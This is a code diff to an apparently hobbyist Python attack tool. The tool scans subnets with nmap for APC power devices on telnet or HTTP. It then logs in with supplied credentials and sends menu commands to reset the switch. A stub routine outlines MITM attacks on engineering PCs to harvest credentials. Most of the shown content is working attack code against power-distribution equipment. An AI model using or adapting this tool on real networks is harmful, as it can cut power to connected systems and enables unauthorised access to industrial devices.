@@ -30,19 +30,25 @@ spinner = Halo(text_color='green',spinner='bouncingBar')
 def recon(ip):
     nm = nmap.PortScanner()
     #prGreen('[*] Running active scan...')
-    spinner.text = 'Running active scan agaisnt: '+ip
+    spinner.text = 'Running active scan agaisnt network: '+ip
     spinner.start()
-    host = nm.scan(ip, arguments='-O -sV')
+    results = nm.scan(ip, arguments='-p 1-1000 -sV')
     spinner.succeed()
     print('\n')
-    prGreen("[+] OS: "+host['scan'][ip]['osmatch'][0]['name'])
-    prGreen('===========================')
-    for port in host['scan'][ip]['tcp']:
-        prGreen('[+] Port Number: ' +str(port))
-        prGreen('[+] State: '+host['scan'][ip]['tcp'][port]['state'])
-        prGreen('[+] Service: '+host['scan'][ip]['tcp'][port]['name'])
-        prGreen('[+] Product: '+host['scan'][ip]['tcp'][port]['product'])
-        print('\n')
+    apc_devices=set()
+    for host in results['scan']:
+            try:
+                for port in results['scan'][host]['tcp']:
+                    service = results['scan'][host]['tcp'][port]['name']
+                    product = results['scan'][host]['tcp'][port]['product']
+                    if (port==23 or port==80) and (service=='telnet' or service=='http') and 'APC' in product:
+                        apc_devices.add(host)
+            except:
+                prRed("[-] No ports found for: "+host)
+    if (len(apc_devices)>0):
+        prGreen("[+] Obtained the following APC device(s):")
+        for t in apc_devices:
+            prGreen("[+] "+t)
 
 #'exploit' telnet (run a bunch of commands to login and reset the switch)
 def exploit_telnet(ip, username,password):
@@ -64,9 +70,7 @@ def exploit_telnet(ip, username,password):
         spinner.text=('[+] Getting data from server...')
         spinner.start()
         res = s.recv(2048)
-        #res = res + s.recv(2048)
         time.sleep(1)
-        #if res==b'\xff\xfb\x01\n\rUser Name : ':
         if b'User Name' in res:
             spinner.succeed()
             spinner.text=('[+] Sending username to socket...')
@@ -97,7 +101,7 @@ def exploit_telnet(ip, username,password):
                 full_res = full_res+res
                 #time.sleep(1)
                 if b'\r\n>' in res:
-                    prGreen('[+] Login successful (apc:apc)!!\n')
+                    prGreen('[+] Login successful ('+username+':'+password+')!!\n')
                     spinner.text = ('[+] Server sent back menu, sending commands to reset the switch...')
                     spinner.start()
                     time.sleep(2)
@@ -144,7 +148,7 @@ def exploit_telnet(ip, username,password):
                 time.sleep(1)
                 if b'Press <ENTER> to continue...' in res:
                     spinner.succeed()
-                    prGreen('[+] Reset successful... break anything good? :^)')
+                    prGreen('[+] Reset successful!)')
                     break    
         else:
             spinner.text=("[-] Server didn't ask for username, someone may already be logged in...")
@@ -189,8 +193,8 @@ def exploit_http(ip, username,password):
     if 'You are now logged off.' in response.text:
         prGreen('[+] Logged out.')
 
-
-#do the demo automatically by scanning the network, looking for potential APC devices and engineering PCs, then MITM them and search for creds, then reset the switch. this may never work. but if it does, it will be a neat little party trick that will impress lots of people. maybe even my dad.
+#do the demo automatically by scanning the network, looking for potential APC devices and engineering PCs, then MITM them and search for creds, then reset the switch. this may never work. but if it does, it will be a neat little party trick that will impress lots of people. 
+#not working atm :(
 def automagic():
     #Scan for APC device
     nm = nmap.PortScanner()
@@ -240,8 +244,6 @@ def automagic():
 
    #if creds found, exploit!
     
-
-    
 #print that banner
 def print_banner():
     fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
@@ -262,7 +264,7 @@ def print_menu():
     try:
         i = int(input())
         if i == 1:
-            ip = str(input("Enter IP of device: "))
+            ip = str(input("Enter network to scan (e.g.10.10.5.1/24): "))
             recon(ip)
         elif i==2:
             ip = str(input("Enter IP of device: "))
@@ -290,7 +292,6 @@ def print_menu():
 
 def main():
     print_menu()
-
 
 if __name__ == "__main__":
     main()
